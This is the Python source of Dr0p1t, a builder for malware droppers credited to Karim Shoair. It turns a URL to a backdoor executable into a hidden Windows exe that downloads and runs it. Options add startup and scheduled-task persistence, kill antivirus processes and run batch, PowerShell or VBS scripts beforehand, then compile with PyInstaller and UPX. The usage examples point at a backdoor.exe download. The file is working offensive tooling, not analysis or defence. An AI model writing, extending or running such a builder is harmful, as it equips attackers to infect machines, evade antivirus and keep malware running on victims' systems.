#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
from core.banners import random_banner as banner
from core.color import *
from core import color,updater
import argparse ,os ,textwrap ,sys ,subprocess, shutil ,random

parser = argparse.ArgumentParser(
usage=argparse.SUPPRESS,
prog='Dr0p1t.py',
formatter_class=argparse.RawDescriptionHelpFormatter,
description=textwrap.dedent( warn() ),
epilog="""\nExamples :
./Dr0p1t.py Malware_Url [Options]
./Dr0p1t.py https://test.com/backdoor.exe -s -t -k --upx
./Dr0p1t.py https://test.com/backdoor.exe -k -b block_online_scan.bat --only32
./Dr0p1t.py https://test.com/backdoor.exe -s -t -k -p Enable_PSRemoting.ps1

Note : Scripts like (bat\\ps1\\vbs) can only loaded from the scripts folder.
        So if you wanna use custom scripts made by yourself,put it in the scripts folder.
"""
)
parser.add_argument("url", metavar='Malware_url',nargs="?", help="Url to your malware")
parser.add_argument("-s", action='store_true', help="Add your malware to startup (Persistence)")
parser.add_argument("-t", action='store_true', help="Add your malware to task scheduler (Persistence)")
parser.add_argument("-k", action='store_true', help="Kill antivirus process before running your malware.")
parser.add_argument("-b", help="Run this batch script before running your malware. Check scripts folder")
parser.add_argument("-p", help="Run this powershell script before running your malware. Check scripts folder")
parser.add_argument("-v", help="Run this vbs script before running your malware. Check scripts folder")
parser.add_argument("--only32",action='store_true', help="Download your malware for 32 bit devices only")
parser.add_argument("--only64",action='store_true', help="Download your malware for 64 bit devices only")
parser.add_argument("--upx",action='store_true', help="Use UPX to compress the final file.")
parser.add_argument("-i", action='store_true', help="Use icon to the final file. Check icons folder.")
parser.add_argument("-q", action='store_true', help="Stay quite ( no banner )")
parser.add_argument("-u", action='store_true', help="Check for updates")
parser.add_argument("-nd", action='store_true', help="Display less output information")
args = parser.parse_args()

def get_code(f):
    code = open( f,"r" ).read()
    return code.split("#Start\n")[1]

def make_copy( old,new ):
    old_file = open( old,"rb" )
    new_file = open( new,"wb" )
    old_data = old_file.read()
    new_file.write( old_data )
    old_file.close()
    new_file.close()

def random_name():
    return "Your_daily_malware_" + str(random.randint(0,100))

def clear():
    if os.name=="nt":
        x=os.system("cls")
    else:
        x=os.system("clear")

def prepare_folder(folder):
    x  = shutil.rmtree(folder, ignore_errors=True)
    xx = os.mkdir(folder)
    xfx = open( os.path.join(folder,"README.md"),"w")
    xfx.write("# Don't mess with this folder or delete it\n")
    xfx.close()


def main():
    prepare_folder("temp")
    prepare_folder("output")
    #clear()
    if args.u:
        updater.check()
        sys.exit(0)

    if not args.u:
        if not args.url:
            print( parser.print_help() )
            x=sys.exit(0)

    if not args.q:
        banner()

    url      = args.url
    command  = "pyinstaller --noconsole -F {} "
    p        = "resources"
    bat_path = ["scripts","bat"]
    ps1_path = ["scripts","powershell"]
    vbs_path = ["scripts","vbs"]
    f        = ""

    print_status(args)
    colored_print( " [*] Creating DR0P3R..","g" )

    if args.s:
        if not args.nd:
            colored_print( " [*] Adding startup function..","g" )
        f += "\nFile = 'hosts.exe'\n"
        f += "\n"+get_code( os.path.join(p,"add2startup.py") )

    if args.t:
        if not args.nd:
            colored_print( " [*] Adding task function..","g" )
        f += "\nFile = 'hosts.exe'\n"
        f += "\n"+get_code( os.path.join(p,"add2task.py") )

    if args.k:
        if not args.nd:
            colored_print( " [*] Adding kill antivirus function..","g" )
        f += "\n"+get_code( os.path.join(p,"killav.py") )

    if args.b:
        try :
            if not args.nd:
                colored_print( " [*] Adding runbat function..","g" )
            bat_path.append(args.b)
            ff = open( os.path.join(*bat_path ) ).read()
            f += "\nBat_Script_Data = '''{}'''\n".format( ff )
            f += "\n"+get_code( os.path.join(p,"Runbat.py") )
        except Exception as e:
            print(e)
            colored_print( " [!] Error in reading bat file,are you sure it's in scripts folder ?","r" )

    if args.p:
        try :
            if not args.nd:
                colored_print( " [*] Adding runps1 function..","g" )
            ps1_path.append(args.p)
            ff = open( os.path.join(*ps1_path ) ).read()
            f += "\nPs1_Script_Data = '''{}'''\n".format( ff )
            f += "\n"+get_code( os.path.join(p,"Runps1.py") )
        except :
            colored_print( " [!] Error in reading ps1 file,are you sure it's in scripts folder ?","r" )

    if args.v:
        try :
            if not args.nd:
                colored_print( " [*] Adding runvbs function..","g" )
            vbs_path.append(args.v)
            ff = open( os.path.join(*vbs_path ) ).read()
            f += "\nVbs_Script_Data = '''{}'''\n".format( ff )
            f += "\n"+get_code( os.path.join(p,"Runvbs.py") )
        except :
            colored_print( " [!] Error in reading vbs file,are you sure it's in scripts folder ?","r" )

    if args.i:
        try:
            if not args.nd:
                colored_print( " [*] Adding icon to the final file..","g" )
            ff = open( args.i ).read()
            command += "--icon=" + args.i
        except:
            colored_print( " [!] Error in icon file so I will use the default one","r" )

    if args.only32:
        f += '\nfire_things_up("{}",arch="32")\n'.format( url )
    elif args.only64:
        f += '\nfire_things_up("{}",arch="64")\n'.format( url )
    elif not args.only32 or not args.only64:
        f += '\nfire_things_up("{}")\n'.format( url )

    f += "\n"+get_code( os.path.join(p,"dropper.py") )

    colored_print( " [*] Compiling the final file to exe..","g" )
    file_name = random_name()
    os.chdir("temp")
    fo = open( file_name+".py","w" )
    fo.write(f)
    fo.close()
    try:
        p  = subprocess.Popen( command.format(file_name+".py"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        (output, err) = p.communicate()
        pw = p.wait()
    except Exception as e:
        print(e)
        colored_print( " [!] Error in compiling file,are you sure pyinstaller is installed ?","r" )
        sys.exit(0)
    os.chdir("..")
    if os.name=="nt":
        file_name = file_name+".exe"
    make_copy( os.path.join("temp","dist",file_name),os.path.join("output",file_name) )

    if args.upx:
        if not args.nd:
            colored_print( " [*] Compressing the final file..","g" )
        x = subprocess.Popen(os.path.join("utils","upx.exe") +" -9 "+os.path.join("output",file_name) ,shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT )


    colored_print( " [*] Finished and saved our Dr0pp3r as "+file_name+" in output folder ( happy hunting )","m" )

if __name__ == '__main__':
    main()
